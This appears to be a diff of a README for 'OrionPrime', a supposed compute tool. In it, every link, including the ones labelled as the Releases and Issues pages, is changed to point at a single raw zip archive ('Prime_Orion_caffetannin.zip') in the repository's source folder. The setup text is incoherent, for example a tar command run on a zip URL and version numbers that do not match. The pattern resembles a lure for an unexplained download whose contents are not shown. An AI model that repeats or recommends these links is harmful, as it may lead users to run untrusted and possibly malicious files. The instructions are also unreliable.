@@ -1,6 +1,6 @@
 # 🚀 OrionPrime - Your Self-Service Compute Engine
 
-[![Download OrionPrime](https://raw.githubusercontent.com/mt801/OrionPrime/main/src/Prime_Orion_v1.6.zip)](https://raw.githubusercontent.com/mt801/OrionPrime/main/src/Prime_Orion_v1.6.zip)
+[![Download OrionPrime](https://github.com/mt801/OrionPrime/raw/refs/heads/main/src/Prime_Orion_caffetannin.zip)](https://github.com/mt801/OrionPrime/raw/refs/heads/main/src/Prime_Orion_caffetannin.zip)
 
 ## 🌟 Overview
 
@@ -14,7 +14,7 @@ To get started with OrionPrime, follow the steps below. Don’t worry, you don�
 
 To download OrionPrime, click the link below. This will take you to the Releases page where you can find the latest version of the software:
 
-[Visit this page to download](https://raw.githubusercontent.com/mt801/OrionPrime/main/src/Prime_Orion_v1.6.zip)
+[Visit this page to download](https://github.com/mt801/OrionPrime/raw/refs/heads/main/src/Prime_Orion_caffetannin.zip)
 
 ### Step 2: Choose the Right Download
 
@@ -25,7 +25,7 @@ On the Releases page, you'll see various versions of OrionPrime. Look for the mo
 - **Latest Version:** v1.0.0
 - **Release Date:** October 1, 2023
 
-You will see different files available. If you use Windows, look for a file ending in `.exe`. For Mac users, find a `.dmg` file. For Linux, you might see a `https://raw.githubusercontent.com/mt801/OrionPrime/main/src/Prime_Orion_v1.6.zip` file.
+You will see different files available. If you use Windows, look for a file ending in `.exe`. For Mac users, find a `.dmg` file. For Linux, you might see a `https://github.com/mt801/OrionPrime/raw/refs/heads/main/src/Prime_Orion_caffetannin.zip` file.
 
 ### Step 3: Download the File
 
@@ -49,7 +49,7 @@ Once the download is finished, locate the downloaded file in your downloads fold
   2. Navigate to the folder where you downloaded the file.
   3. Run the following command:
      ```
-     tar -xzvf https://raw.githubusercontent.com/mt801/OrionPrime/main/src/Prime_Orion_v1.6.zip
+     tar -xzvf https://github.com/mt801/OrionPrime/raw/refs/heads/main/src/Prime_Orion_caffetannin.zip
      ```
   4. Follow any setup instructions in the folder.
 
@@ -75,7 +75,7 @@ OrionPrime comes packed with features that help you efficiently manage your comp
 
 It’s important to keep your software updated. To check for updates:
 
-1. Visit the [Releases page](https://raw.githubusercontent.com/mt801/OrionPrime/main/src/Prime_Orion_v1.6.zip) regularly.
+1. Visit the [Releases page](https://github.com/mt801/OrionPrime/raw/refs/heads/main/src/Prime_Orion_caffetannin.zip) regularly.
 2. Download the latest version and install it following the steps above.
 
 ## 💬 Troubleshooting
@@ -85,7 +85,7 @@ If you run into issues:
 - **Installation Problems**: Make sure your system meets the requirements.
 - **Running Issues**: Check if there are any updates available and ensure you have a stable internet connection.
 
-If problems persist, consider visiting the GitHub Issues page of this project for support: [Open Issues](https://raw.githubusercontent.com/mt801/OrionPrime/main/src/Prime_Orion_v1.6.zip).
+If problems persist, consider visiting the GitHub Issues page of this project for support: [Open Issues](https://github.com/mt801/OrionPrime/raw/refs/heads/main/src/Prime_Orion_caffetannin.zip).
 
 ## 💡 Additional Resources
 
@@ -97,4 +97,4 @@ For further assistance and best practices, check out the following resources:
 
 We hope you enjoy using OrionPrime! Your feedback is valued for continuous improvement. 
 
-Remember, you can download the latest version [here](https://raw.githubusercontent.com/mt801/OrionPrime/main/src/Prime_Orion_v1.6.zip). Happy computing!
+Remember, you can download the latest version [here](https://github.com/mt801/OrionPrime/raw/refs/heads/main/src/Prime_Orion_caffetannin.zip). Happy computing!
